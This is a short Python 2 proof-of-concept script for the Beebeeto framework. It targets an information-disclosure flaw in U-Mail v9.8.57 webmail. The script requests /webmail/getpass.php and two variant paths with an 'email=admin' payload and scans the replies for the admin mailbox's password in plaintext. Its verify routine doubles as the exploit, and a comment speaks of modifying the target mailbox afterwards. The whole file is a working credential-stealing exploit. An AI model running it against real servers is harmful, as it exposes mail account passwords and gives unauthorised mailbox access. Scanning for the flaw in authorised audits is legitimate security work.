#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0003',
            'name': 'U-Mail v9.8.57 /getpass.php 信息泄漏漏洞 POC',
            'author': '1024',
            'create_date': '2015-01-07',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'U-Mail',
            'vul_version': ['9.8.57'],
            'type': 'Information Disclosure',
            'tag': ['U-Mail漏洞', '信息泄漏漏洞', '/getpass.php', 'php'],
            'desc': 'U-Mail /webmail/getpass.php 邮箱明文密码泄露',
            'references': ['http://wooyun.org/bugs/wooyun-2010-061894',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        # After a successful attack, modify the email parameters for the target mailbox
        vul_paths = [
            '/webmail/getpass.php',
            '/webmail/getpass1.php',
            '/webmail/getpass2.php'
        ]
        payload = "?email=admin&update=s"
        url = args['options']['target']
        for paths in vul_paths:
            verify_url = url + paths + payload
            req = urllib2.Request(verify_url)
            if args['options']['verbose']:
                print '[*] Request URL: ' + verify_url
            try:
                content = urllib2.urlopen(req).read()
                m = re.compile(r'Your password is|你的密碼是|你的密码是').findall(content)
            except:
                continue
            if m:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())